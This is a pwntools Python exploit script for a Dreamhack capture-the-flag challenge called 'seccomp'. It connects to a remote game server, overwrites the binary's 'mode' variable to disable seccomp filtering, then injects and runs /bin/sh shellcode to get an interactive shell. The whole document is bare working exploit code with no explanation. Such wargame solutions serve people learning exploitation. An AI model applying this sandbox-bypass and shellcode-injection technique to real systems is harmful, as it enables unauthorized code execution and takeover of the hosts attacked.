from pwn import *

context.arch = "x86_64"



p = process("./seccomp")
p = remote("host3.dreamhack.games", 24255)
e = ELF("./seccomp")

mode_addr = e.symbols['mode']

shellcode = shellcraft.sh()
shellcode = asm(shellcode)
shellcode += b"A"* (1024 -len(shellcode))
def write_addr(addr: bytes, value: bytes):
	p.sendlineafter(b"> ", b"3")
	p.sendlineafter(b"addr: ", addr)
	p.sendlineafter(b"value: ", value)

def read(shellcode: bytes):
	p.sendlineafter(b"> ", b"1")
	p.sendafter(b"shellcode: ", shellcode)

def execute():
	p.sendlineafter(b"> ", b"2")
	
write_addr(str(mode_addr).encode(), b"0")
read(shellcode)
execute()


p.interactive()
